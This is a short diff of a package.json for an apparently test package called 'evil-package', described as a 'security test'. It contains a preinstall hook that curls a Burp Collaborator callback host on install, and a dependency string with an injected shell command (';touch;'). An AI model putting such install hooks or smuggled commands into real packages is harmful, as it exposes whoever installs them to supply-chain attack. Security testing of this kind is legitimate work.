@@ -1,5 +1,5 @@
 {
-  "name": "evil-package",
+  "name": "evil-package-sample",
   "version": "1.0.0",
   "description": "security test",
   "main": "index.js",
@@ -10,7 +10,7 @@
     "preinstall":"echo EVIL PACKAGE PREINSTALL; curl http://szvk5zzm4znlqxwjfkloa2pzlqrif7.burpcollaborator.net/ok"
   },
   "dependencies": {
-    "evil":"git+https://github.com/No1zy/a;touch;"
+    "no1zy-evil-sample":"git+https://github.com/No1zy/a;touch;"
   },
   "repository": {
     "type": "git",
